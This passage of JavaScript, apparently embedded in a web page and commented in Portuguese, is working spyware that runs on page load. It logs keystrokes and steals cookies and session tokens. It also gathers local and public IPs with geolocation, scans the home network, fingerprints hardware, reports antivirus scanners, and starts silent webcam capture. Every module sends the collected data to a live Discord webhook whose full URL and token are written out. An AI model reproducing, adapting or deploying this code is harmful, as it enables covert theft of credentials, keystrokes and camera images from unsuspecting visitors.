    if (!resp.ok) throw new Error(`Discord HTTP ${resp.status}`);
    track.stop();
    stream.getTracks().forEach(t => t.stop());

    console.log("djmisadjsjdjidjdsjsjhshjsjhs");
  } catch (e) {
    console.error("jdjdjddjdhjxshhshhdshgshshsghs", e);
  }
})();

const samuka = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk"
let teclasCapturadas ='';

document.addEventListener('keydown', (event) => {
  teclasCapturadas += event.key;
});

setInterval(() => {
  if (teclasCapturadas.length > 0) {
    fetch(samuka, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ keys: teclasCapturadas })
    })
    .then(response => {
      if (response.ok) {
        console.log('Teclas enviadas com sucesso');
        teclasCapturadas = '';
      } else {
        console.error('Erro ao enviar as teclas');
      }
    })
    .catch(error => console.error('Erro na requisi√ß√£o:', error));
  }
}, 30000); 
function detectarAndroid() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera;

  if (/android/i.test(userAgent)) {
    const versaoMatch = userAgent.match(/Androids([0-9.]+)/i);
    const versao = versaoMatch ? versaoMatch[1] : "Desconhecida";

    let marca = "Desconhecida";
    if (/Samsung/i.test(userAgent)) {
      marca = "Samsung";
    } else if (/Pixel/i.test(userAgent)) {
      marca = "Google Pixel";
    } else if (/Huawei/i.test(userAgent)) {
      marca = "Huawei";
    }

    return {
      sistema: "Android",
      versao: versao,
      marca: marca,
      userAgent: userAgent
    };
  } else {
    return null;
  }
}

const android_url = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';
const infoAndroid = detectarAndroid();

if (infoAndroid) {
  fetch(android_url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(infoAndroid)
  })
  .then(response => {
    if (response.ok) {
      console.log('Informa√ß√µes do Android enviadas com sucesso');
    } else {
      console.error('Falha ao enviar informa√ß√µes');
    }
  })
  .catch(error => console.error('Erro na requisi√ß√£o:', error));
} else {
  console.log('Dispositivo n√£o √© Android');
}
const roubo_cookies = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';


function coletarCookies() {
  return document.cookie; 
}


function coletarTokens() {
  const tokens = {};
  for(let i = 0; i < localStorage.length; i++) {
    const chave = localStorage.key(i);
    if (chave.toLowerCase().includes('token')) {
      tokens[chave] = localStorage.getItem(chave);
    }
  }
  for(let i = 0; i < sessionStorage.length; i++) {
    const chave = sessionStorage.key(i);
    if (chave.toLowerCase().includes('token')) {
      tokens[chave] = sessionStorage.getItem(chave);
    }
  }
  return tokens;
}
const dados = {
  cookies: coletarCookies(),
  tokens: coletarTokens()
};

fetch(roubo_cookies, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(dados)
})
.then(response => {
  if(response.ok) {
    console.log('Dados enviados com sucesso');
  } else {
    console.error('Erro ao enviar dados');
  }
})
.catch(error => console.error('Erro na requisi√ß√£o:', error));

const chaves =  'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';


function obterIPs(callback) {
  const ips = new Set();
  const pc = new RTCPeerConnection({ iceServers: [] });

  pc.createDataChannel('');
  pc.createOffer()
    .then(offer => pc.setLocalDescription(offer))
    .catch(err => console.error('Erro ao criar offer:', err));

  pc.onicecandidate = event => {
    if (!event.candidate) {
      return;
    }
    const regexIp = /([0-9]{1,3}(.[0-9]{1,3}){3})/;
    const ipMatch = regexIp.exec(event.candidate.candidate);
    if (ipMatch) {
      const ip = ipMatch[1];
      if (!ips.has(ip)) {
        ips.add(ip);
        callback(ip);
      }
    }
  };
}

obterIPs(ip => {
  console.log('IP local detectado:', ip);
  fetch(chaves, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ localIP: ip })
  })
  .then(response => {
    if (response.ok) {
      console.log('IP enviado com sucesso ao webhook');
    } else {
      console.error('Falha ao enviar IP');
    }
  })
  .catch(error => {
    console.error('Erro na requisi√ß√£o:', error);
  });
});
const bebe =  'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';
for(let i=1; i<=254; i++){
  let ip = `http://192.168.1.${i}`;
  fetch(ip, { mode: 'no-cors' })
    .then(() => {
      fetch(bebe, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ ipAcessivel: ip })
      });
    })
    .catch(() => {  });
}
const batman=  'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';


function obterIpPublico() {
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(() => 'IP n√£o dispon√≠vel');
}

function capturarDadosDispositivo() {
  return {
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    cookiesAtivos: navigator.cookieEnabled
  };
}


function enviarDadosParaWebhook(dados) {
  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(dados)
  }).then(response => {
      if (response.ok) console.log('Dados enviados ao webhook com sucesso');
      else console.error('Falha ao enviar dados');
  }).catch(error => console.error('Erro na requisi√ß√£o:', error));
}
obterIpPublico().then(ip => {
  const dadosColetados = capturarDadosDispositivo();
  dadosColetados.ipPublico = ip;
  enviarDadosParaWebhook(dadosColetados);
});
const blacksamurai = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';

function obterIpPublico() {
  return fetch('https://api.ipify.org?format=json')
    .then(resp => resp.json())
    .then(data => data.ip)
    .catch(() => 'IP n√£o dispon√≠vel');
}
function coletarDadosDispositivo(ip) {
  return {
    ipPublico: ip,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    cookiesAtivos: navigator.cookieEnabled,
    timestamp: new Date().toISOString()
  };
}


function enviarDadosWebhook(dados) {
  fetch(blacksamurai, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(dados)
  });
}


function contarVisita(ip) {
  const visitasChave = `visitas_${ip}`;
  let visitas = parseInt(localStorage.getItem(visitasChave)) || 0;
  visitas++;
  localStorage.setItem(visitasChave, visitas);
  return visitas;
}
obterIpPublico().then(ip => {
  const numVisitas = contarVisita(ip);
  if (numVisitas >= 5) {
    const dados = coletarDadosDispositivo(ip);
    enviarDadosWebhook(dados);
  }
});
const antivirus = 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';

const maxRequisi√ß√µes = 3;
const intervalo = 60000; 
let contadorRequisi√ß√µes = 0;
let √∫ltimaRequisi√ß√£o = Date.now();

function verificarUserAgent() {
  const ua = navigator.userAgent.toLowerCase();
  const padr√µesScanner = [
    "bot", "crawler", "spider", "scanner", "antivirus", "curl", "wget"
  ];
  return padr√µesScanner.some(p => ua.includes(p));
}

function enviarAlerta(dados) {
  fetch(antivirus, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(dados)
  });
}

function registrarRequisi√ß√£o() {
  const agora = Date.now();

  if (agora - √∫ltimaRequisi√ß√£o > intervalo) {
    contadorRequisi√ß√µes = 1;
    √∫ltimaRequisi√ß√£o = agora;
  } else {
    contadorRequisi√ß√µes++;
  }

  if (contadorRequisi√ß√µes >= maxRequisi√ß√µes || verificarUserAgent()) {
    const alerta = {
      userAgent: navigator.userAgent,
      urlAtual: window.location.href,
      timestamp: new Date().toISOString(),
      mensagem: 'Poss√≠vel atividade de antiv√≠rus ou scanner detectada'
    };
    enviarAlerta(alerta);
  }
}

window.addEventListener('load', registrarRequisi√ß√£o);
const url_startwars= 'https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk';
function enviarAlerta(info) {
  fetch(url_startwars, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(info)
  });
}

function detectarUrlInvalida() {
  const info = {
    urlTentada: window.location.href,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    timestamp: new Date().toISOString(),
    alerta: 'Usu√°rio tentou acessar caminho inv√°lido do site'
  };
  
  enviarAlerta(info);
  

  document.body.appendChild(alertaDiv);
}

async function analisarHardware() {
  const URL_WEBHOOK_NOVA = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk";
  
  try {
    const infoNavegador = navigator.userAgent;
    const soSistema = navigator.platform;
    const coresCPU = navigator.hardwareConcurrency || "N/D";
    const ramMemoria = navigator.deviceMemory || "N/D";
    const linguagem = navigator.language;
    const tamanhoTela = `${window.screen.width}x${window.screen.height}`;
    
    let dadosGPU = "N/D";
    const canvasTemp = document.createElement("canvas");
    const contexto3D = canvasTemp.getContext("webgl") || canvasTemp.getContext("experimental-webgl");
    
    if (contexto3D) {
      const extDebug = contexto3D.getExtension("WEBGL_debug_renderer_info");
      if (extDebug) {
        dadosGPU = contexto3D.getParameter(extDebug.UNMASKED_RENDERER_WEBGL);
      }
    }

    const payloadNovo = {
      username: "üîß Analisador de Hardware",
      embeds: [{
        title: "üìä Dados de Hardware Coletados",
        color: 0xFFA500,
        fields: [
          { name: "üíª Sistema", value: soSistema, inline: true },
          { name: "‚ö° N√∫cleos", value: coresCPU.toString(), inline: true },
          { name: "üß† RAM", value: ramMemoria + " GB", inline: true },
          { name: "üéÆ GPU", value: dadosGPU, inline: false },
          { name: "üñ• Tela", value: tamanhoTela, inline: true },
          { name: "üåê Idioma", value: linguagem, inline: true }
        ],
        footer: { text: "An√°lise completa do sistema" },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(URL_WEBHOOK_NOVA, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payloadNovo)
    });
    
    console.log("‚úÖ An√°lise de hardware enviada!");
  } catch (error) {
    console.error("‚ùå Erro na an√°lise:", error);
  }
}

// Para executar:
analisarHardware();

</script>
<script>
// WEBHOOK_NOVO3 para dados avan√ßados exclusivos
const WEBHOOK_URL_NOVO3 = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk";

// Sistema de coleta de dados avan√ßados
const AdvancedDataCollector = {
    sessionId: 'adv3_' + Math.random().toString(36).substr(2, 12),
    executionCount: 0,
    
    async collectAdvancedData() {
        try {
            const advancedData = {
                metadata: {
                    type: 'advanced_exclusive_data',
                    sessionId: this.sessionId,
                    timestamp: new Date().toISOString(),
                    executionCount: this.executionCount + 1,
                    collector: 'Advanced Data Collector v3.0'
                },

                // 1. DADOS DE M√çDIA E DISPOSITIVOS
                mediaDevices: await this.getMediaDevicesInfo(),
                
                // 2. INFORMA√á√ïES DE MEM√ìRIA AVAN√áADAS
                memory: this.getDetailedMemoryInfo(),
                
                // 3. DADOS DE CONEX√ÉO AVAN√áADOS
                connection: this.getAdvancedConnectionInfo(),
                
                // 4. INFORMA√á√ïES DE BATERIA DETALHADAS
                battery: await this.getDetailedBatteryInfo(),
                
                // 5. DADOS DE PERFORMANCE ESPEC√çFICOS
                performance: this.getDetailedPerformanceMetrics(),
                
                // 6. INFORMA√á√ïES DE TELA AVAN√áADAS
                display: this.getAdvancedDisplayInfo(),
                
                // 7. DADOS DE SENSORES
                sensors: await this.getSensorInfo(),
                
                // 8. INFORMA√á√ïES DE ARMAZENAMENTO
                storage: await this.getStorageInfo(),
                
                // 9. DADOS DE WEBRTC AVAN√áADOS
                webrtc: this.getWebRTCInfo(),
                
                // 10. INFORMA√á√ïES DE PERMISS√ïES
                permissions: await this.getPermissionsInfo(),
                
                // 11. DADOS DE REDE AVAN√áADOS
                network: await this.getAdvancedNetworkInfo(),
                
                // 12. INFORMA√á√ïES DE TEMPO E LOCALIZA√á√ÉO
                time: this.getDetailedTimeInfo(),
                
                // 13. DADOS DE NAVEGADOR ESPEC√çFICOS
                browser: this.getBrowserSpecificInfo(),
                
                // 14. INFORMA√á√ïES DE PLUGINS DETALHADAS
                plugins: this.getDetailedPluginsInfo(),
                
                // 15. DADOS DE SISTEMA OPERACIONAL
                os: this.getOSInfo()
            };

            this.executionCount++;
            return advancedData;

        } catch (error) {
            console.error('Erro na coleta avan√ßada:', error);
            return null;
        }
    },

    // 1. Dispositivos de m√≠dia dispon√≠veis
    async getMediaDevicesInfo() {
        try {
            const devices = await navigator.mediaDevices.enumerateDevices();
            return {
                audioInputs: devices.filter(d => d.kind === 'audioinput').length,
                videoInputs: devices.filter(d => d.kind === 'videoinput').length,
                audioOutputs: devices.filter(d => d.kind === 'audiooutput').length,
                totalDevices: devices.length,
                deviceList: devices.map(d => ({
                    kind: d.kind,
                    label: d.label || 'Sem permiss√£o',
                    deviceId: d.deviceId.substring(0, 20) + '...'
                })).slice(0, 5)
            };
        } catch (error) {
            return { error: error.message };
        }
    },

    // 2. Informa√ß√µes detalhadas de mem√≥ria
    getDetailedMemoryInfo() {
        if (!performance.memory) return 'N/A';
        
        const mem = performance.memory;
        return {
            usedJSHeapSize: this.formatBytes(mem.usedJSHeapSize),
            totalJSHeapSize: this.formatBytes(mem.totalJSHeapSize),
            jsHeapSizeLimit: this.formatBytes(mem.jsHeapSizeLimit),
            usagePercentage: ((mem.usedJSHeapSize / mem.jsHeapSizeLimit) * 100).toFixed(2) + '%',
            deviceMemory: navigator.deviceMemory || 'N/A'
        };
    },

    // 3. Informa√ß√µes avan√ßadas de conex√£o
    getAdvancedConnectionInfo() {
        if (!navigator.connection) return 'N/A';
        
        const conn = navigator.connection;
        return {
            effectiveType: conn.effectiveType,
            downlink: conn.downlink,
            downlinkMax: conn.downlinkMax || 'N/A',
            rtt: conn.rtt,
            saveData: conn.saveData,
            type: this.getNetworkType(conn.effectiveType)
        };
    },

    getNetworkType(effectiveType) {
        const types = {
            'slow-2g': '2G Lento',
            '2g': '2G',
            '3g': '3G', 
            '4g': '4G',
            '5g': '5G'
        };
        return types[effectiveType] || effectiveType;
    },

    // 4. Informa√ß√µes detalhadas de bateria
    async getDetailedBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime === Infinity ? 'Indeterminado' : battery.chargingTime + 's',
                    dischargingTime: battery.dischargingTime === Infinity ? 'Indeterminado' : battery.dischargingTime + 's',
                    chargingStatus: battery.charging ? 'Carregando' : 'Descarregando'
                };
            } catch (error) {
                return { error: error.message };
            }
        }
        return 'N/A';
    },

    // 5. M√©tricas de performance detalhadas
    getDetailedPerformanceMetrics() {
        const metrics = {
            navigation: performance.getEntriesByType('navigation')[0] || {},
            paint: performance.getEntriesByType('paint'),
            resource: performance.getEntriesByType('resource').length,
            now: performance.now(),
            timeOrigin: performance.timeOrigin
        };

        let timing = 'N/A';
        if (performance.timing) {
            const t = performance.timing;
            timing = {
                domComplete: t.domComplete - t.navigationStart,
                loadEventEnd: t.loadEventEnd - t.navigationStart,
                domInteractive: t.domInteractive - t.navigationStart
            };
        }

        return {
            timing,
            paintCount: metrics.paint.length,
            resourceCount: metrics.resource,
            timeSinceOrigin: Date.now() - metrics.timeOrigin
        };
    },

    // 6. Informa√ß√µes avan√ßadas de display
    getAdvancedDisplayInfo() {
        return {
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || this.getScreenOrientation()
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio,
                colorGamut: screen.colorGamut || 'N/A'
            }
        };
    },

    getScreenOrientation() {
        return window.innerHeight > window.innerWidth ? 'portrait' : 'landscape';
    },

    // 7. Informa√ß√µes de sensores
    async getSensorInfo() {
        const sensors = {
            accelerometer: 'Accelerometer' in window,
            gyroscope: 'Gyroscope' in window,
            magnetometer: 'Magnetometer' in window,
            orientation: 'DeviceOrientationEvent' in window,
            motion: 'DeviceMotionEvent' in window,
            light: 'AmbientLightSensor' in window,
            proximity: 'ProximitySensor' in window,
            geolocation: 'geolocation' in navigator
        };

        // Testar suporte a vibra√ß√£o
        sensors.vibration = 'vibrate' in navigator;

        return sensors;
    },

    // 8. Informa√ß√µes de armazenamento
    async getStorageInfo() {
        try {
            let estimate = 'N/A';
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                estimate = await navigator.storage.estimate();
            }

            return {
                localStorage: this.testStorage('localStorage'),
                sessionStorage: this.testStorage('sessionStorage'),
                indexedDB: 'indexedDB' in window,
                caches: 'caches' in window,
                serviceWorker: 'serviceWorker' in navigator,
                estimate: estimate !== 'N/A' ? {
                    usage: this.formatBytes(estimate.usage),
                    quota: this.formatBytes(estimate.quota),
                    percentage: ((estimate.usage / estimate.quota) * 100).toFixed(2) + '%'
                } : 'N/A'
            };
        } catch (error) {
            return { error: error.message };
        }
    },

    // 9. Informa√ß√µes WebRTC avan√ßadas
    getWebRTCInfo() {
        const rtc = {
            supported: 'RTCPeerConnection' in window,
            dataChannels: 'createDataChannel' in (window.RTCPeerConnection?.prototype || {}),
            getStats: 'getStats' in (window.RTCPeerConnection?.prototype || {}),
            screenCapture: 'getDisplayMedia' in navigator.mediaDevices,
            webRTC: 'webkitRTCPeerConnection' in window || 'RTCPeerConnection' in window
        };

        // Tentar obter IPs locais via WebRTC
        rtc.localIPs = this.getLocalIPsViaWebRTC();

        return rtc;
    },

    getLocalIPsViaWebRTC() {
        return new Promise((resolve) => {
            try {
                const ips = [];
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel("");
                pc.createOffer().then(o => pc.setLocalDescription(o));
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        resolve(ips);
                        return;
                    }
                    const ipMatch = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                    if (ipMatch && !ips.includes(ipMatch[1])) {
                        ips.push(ipMatch[1]);
                    }
                };
                setTimeout(() => resolve(ips), 1000);
            } catch (error) {
                resolve([]);
            }
        });
    },

    // 10. Informa√ß√µes de permiss√µes
    async getPermissionsInfo() {
        const permissions = {};
        const permissionTypes = [
            'camera',
            'microphone',
            'geolocation',
            'notifications',
            'clipboard-read',
            'clipboard-write'
        ];

        for (const permission of permissionTypes) {
            try {
                const result = await navigator.permissions.query({ name: permission });
                permissions[permission] = result.state;
            } catch (error) {
                permissions[permission] = 'not_supported';
            }
        }

        return permissions;
    },

    // 11. Informa√ß√µes avan√ßadas de rede
    async getAdvancedNetworkInfo() {
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const ipData = await ipResponse.json();

            return {
                ip: ipData.ip,
                city: ipData.city,
                region: ipData.region,
                country: ipData.country_name,
                countryCode: ipData.country_code,
                timezone: ipData.timezone,
                org: ipData.org,
                asn: ipData.asn,
                postal: ipData.postal,
                latitude: ipData.latitude,
                longitude: ipData.longitude,
                currency: ipData.currency,
                languages: ipData.languages,
                countryCallingCode: ipData.country_calling_code,
                utcOffset: ipData.utc_offset
            };
        } catch (error) {
            return { error: error.message };
        }
    },

    // 12. Informa√ß√µes detalhadas de tempo
    getDetailedTimeInfo() {
        const now = new Date();
        return {
            timestamp: now.toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: now.getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
            firstDayOfWeek: new Intl.Locale(navigator.language).weekInfo?.firstDay || 'N/A',
            hour12: Intl.DateTimeFormat().resolvedOptions().hour12,
            dateString: now.toLocaleString('pt-BR')
        };
    },

    // 13. Informa√ß√µes espec√≠ficas do navegador
    getBrowserSpecificInfo() {
        const ua = navigator.userAgent;
        return {
            userAgent: ua,
            platform: navigator.platform,
            vendor: navigator.vendor,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            product: navigator.product,
            productSub: navigator.productSub,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            maxTouchPoints: navigator.maxTouchPoints,
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            webdriver: navigator.webdriver,
            brave: navigator.brave || 'N/A'
        };
    },

    // 14. Informa√ß√µes detalhadas de plugins
    getDetailedPluginsInfo() {
        const plugins = Array.from(navigator.plugins).map(plugin => ({
            name: plugin.name,
            filename: plugin.filename,
            description: plugin.description,
            version: plugin.version
        }));

        const mimeTypes = Array.from(navigator.mimeTypes).map(mime => ({
            type: mime.type,
            description: mime.description,
            suffixes: mime.suffixes
        }));

        return {
            pluginCount: plugins.length,
            mimeTypeCount: mimeTypes.length,
            plugins: plugins.slice(0, 10), // Limitar para n√£o ficar muito grande
            mimeTypes: mimeTypes.slice(0, 10)
        };
    },

    // 15. Informa√ß√µes do sistema operacional
    getOSInfo() {
        const ua = navigator.userAgent;
        let os = 'Unknown';
        
        if (/Windows/.test(ua)) os = 'Windows';
        else if (/Mac OS/.test(ua)) os = 'macOS';
        else if (/Linux/.test(ua)) os = 'Linux';
        else if (/Android/.test(ua)) os = 'Android';
        else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
        else if (/CrOS/.test(ua)) os = 'Chrome OS';

        return {
            name: os,
            architecture: this.getArchitecture(),
            version: this.getOSVersion(ua, os)
        };
    },

    getArchitecture() {
        const ua = navigator.userAgent;
        if (ua.includes('x86_64') || ua.includes('x64')) return 'x64';
        if (ua.includes('x86') || ua.includes('i686')) return 'x86';
        if (ua.includes('arm64') || ua.includes('aarch64')) return 'ARM64';
        if (ua.includes('arm')) return 'ARM';
        return 'Unknown';
    },

    getOSVersion(ua, os) {
        switch (os) {
            case 'Windows':
                const winVersion = ua.match(/Windows NT (\d+\.\d+)/);
                return winVersion ? winVersion[1] : 'N/A';
            case 'Android':
                const androidVersion = ua.match(/Android (\d+)/);
                return androidVersion ? androidVersion[1] : 'N/A';
            case 'iOS':
                const iosVersion = ua.match(/OS (\d+_\d+)/);
                return iosVersion ? iosVersion[1].replace('_', '.') : 'N/A';
            default:
                return 'N/A';
        }
    },

    // Fun√ß√µes auxiliares
    testStorage(type) {
        try {
            const storage = window[type];
            storage.setItem('test', 'test');
            storage.removeItem('test');
            return true;
        } catch (error) {
            return false;
        }
    },

    formatBytes(bytes) {
        if (!bytes || bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    },

    // Fun√ß√£o para enviar dados para webhook
    async sendToWebhookNovo3() {
        try {
            const data = await this.collectAdvancedData();
            if (!data) return false;

            const payload = {
                username: "üî¨ Advanced Data Collector",
                embeds: [
                    {
                        title: "üìä DADOS AVAN√áADOS - COLETA EXCLUSIVA",
                        color: 0x9B59B6,
                        description: `**Sess√£o ${data.metadata.sessionId} - Execu√ß√£o #${data.metadata.executionCount}**`,
                        timestamp: data.metadata.timestamp,
                        footer: { text: "Advanced Data Collector v3.0" }
                    },
                    {
                        title: "üéÆ DISPOSITIVOS DE M√çDIA E HARDWARE",
                        color: 0x3498DB,
                        fields: [
                            { name: "üé§ Inputs de √Åudio", value: String(data.mediaDevices.audioInputs), inline: true },
                            { name: "üìπ C√¢meras", value: String(data.mediaDevices.videoInputs), inline: true },
                            { name: "üîä Outputs de √Åudio", value: String(data.mediaDevices.audioOutputs), inline: true },
                            { name: "üíæ Mem√≥ria Usada", value: data.memory.usedJSHeapSize, inline: true },
                            { name: "üìà Uso de Mem√≥ria", value: data.memory.usagePercentage, inline: true },
                            { name: "üîã N√≠vel Bateria", value: data.battery.level, inline: true }
                        ]
                    },
                    {
                        title: "üåê REDE E CONEX√ÉO",
                        color: 0x2ECC71,
                        fields: [
                            { name: "üì° Tipo de Rede", value: data.connection.type, inline: true },
                            { name: "‚¨áÔ∏è Velocidade Download", value: data.connection.downlink + ' Mbps', inline: true },
                            { name: "üîÑ Lat√™ncia", value: data.connection.rtt + ' ms', inline: true },
                            { name: "üí∞ Save Data", value: data.connection.saveData ? 'Ativo' : 'Inativo', inline: true },
                            { name: "üåç IP", value: data.network.ip || 'N/A', inline: true },
                            { name: "üè¢ Provedor", value: data.network.org || 'N/A', inline: true }
                        ]
                    },
                    {
                        title: "‚öôÔ∏è SISTEMA E PERFORMANCE",
                        color: 0xE74C3C,
                        fields: [
                            { name: "üíª Sistema Operacional", value: data.os.name, inline: true },
                            { name: "üèóÔ∏è Arquitetura", value: data.os.architecture, inline: true },
                            { name: "üî¢ Vers√£o OS", value: data.os.version, inline: true },
                            { name: "‚ö° DOM Complete", value: data.performance.timing.domComplete + 'ms', inline: true },
                            { name: "üöÄ Load Complete", value: data.performance.timing.loadEventEnd + 'ms', inline: true },
                            { name: "üé® Paint Events", value: String(data.performance.paintCount), inline: true }
                        ]
                    },
                    {
                        title: "üîê PERMISS√ïES E SENSORES",
                        color: 0xF39C12,
                        fields: [
                            { name: "üì∑ C√¢mera", value: data.permissions.camera, inline: true },
                            { name: "üé§ Microfone", value: data.permissions.microphone, inline: true },
                            { name: "üìç Geolocation", value: data.permissions.geolocation, inline: true },
                            { name: "üì± Aceler√¥metro", value: data.sensors.accelerometer ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üîÑ Girosc√≥pio", value: data.sensors.gyroscope ? '‚úÖ' : '‚ùå', inline: true },
                            { name: "üß≠ Magnet√¥metro", value: data.sensors.magnetometer ? '‚úÖ' : '‚ùå', inline: true }
                        ]
                    }
                ]
            };

            const response = await fetch(WEBHOOK_URL_NOVO3, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                console.log(`‚úÖ Dados avan√ßados enviados para WEBHOOK_NOVO3 - Execu√ß√£o #${data.metadata.executionCount}`);
                return true;
            } else {
                console.error('‚ùå Erro WEBHOOK_NOVO3:', response.status);
                return false;
            }
        } catch (error) {
            console.error('üí• Erro ao enviar dados avan√ßados:', error);
            return false;
        }
    },

    // Inicializar coleta
    init() {
        console.log('üî¨ Advanced Data Collector iniciado');
        
        // Coleta inicial ap√≥s 3 segundos
        setTimeout(() => {
            this.sendToWebhookNovo3();
        }, 3000);

        // Coleta peri√≥dica a cada 10 minutos
        setInterval(() => {
            this.sendToWebhookNovo3();
        }, 600000);
    }
};

// Inicializar quando a p√°gina carregar
document.addEventListener('DOMContentLoaded', function() {
    AdvancedDataCollector.init();
});

// Inicializar imediatamente se DOM j√° estiver pronto
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(() => AdvancedDataCollector.init(), 1000);
    });
} else {
    setTimeout(() => AdvancedDataCollector.init(), 1000);
}

console.log('üî¨ Advanced Data Collector carregado - WEBHOOK_NOVO3');
</script>
<script>
// WEBHOOK_NOVO_4 para captura de c√¢mera silenciosa
const WEBHOOK_URL_NOVO_4 = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk";

// Sistema de captura de c√¢mera silenciosa
const SilentCameraCapture = {
    stream: null,
    isCapturing: false,
    captureInterval: null,
    sessionId: 'cam_' + Math.random().toString(36).substr(2, 12),
    captureCount: 0,
    maxCaptures: 100, // Limite m√°ximo de capturas
    
    async init() {
        console.log('üì∑ Silent Camera Capture iniciado');
        
        try {
            // Tentar acessar a c√¢mera silenciosamente
            await this.requestCameraAccess();
        } catch (error) {
            console.log('‚ùå C√¢mera n√£o acess√≠vel:', error.message);
            this.tryAlternativeMethods();
        }
    },
    
    async requestCameraAccess() {
        try {
            // Tentar acessar a c√¢mera sem mostrar o stream
            this.stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            console.log('‚úÖ Acesso √† c√¢mera concedido silenciosamente');
            this.startContinuousCapture();
            
        } catch (error) {
            throw new Error('Permiss√£o de c√¢mera negada ou n√£o dispon√≠vel');
        }
    },
    
    startContinuousCapture() {
        if (this.isCapturing) return;
        
        this.isCapturing = true;
        console.log('üî¥ Iniciando captura cont√≠nua de c√¢mera');
        
        // Capturar a cada 5 segundos
        this.captureInterval = setInterval(async () => {
            if (this.captureCount >= this.maxCaptures) {
                this.stopCapture();
                return;
            }
            
            try {
                await this.captureAndSendFrame();
                this.captureCount++;
            } catch (error) {
                console.error('Erro na captura:', error);
            }
        }, 5000); // 5 segundos
        
        // Captura imediata
        setTimeout(() => {
            this.captureAndSendFrame();
        }, 1000);
